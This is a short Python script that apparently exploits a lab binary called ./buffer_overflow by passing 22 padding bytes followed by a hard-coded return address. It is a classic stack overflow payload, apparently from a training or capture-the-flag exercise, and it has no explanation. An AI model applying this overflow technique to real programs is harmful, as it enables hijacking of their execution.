#!/usr/bin/python

from subprocess import call

call(["./buffer_overflow", "a"*22 + "\x86\x84\x04\x08"])
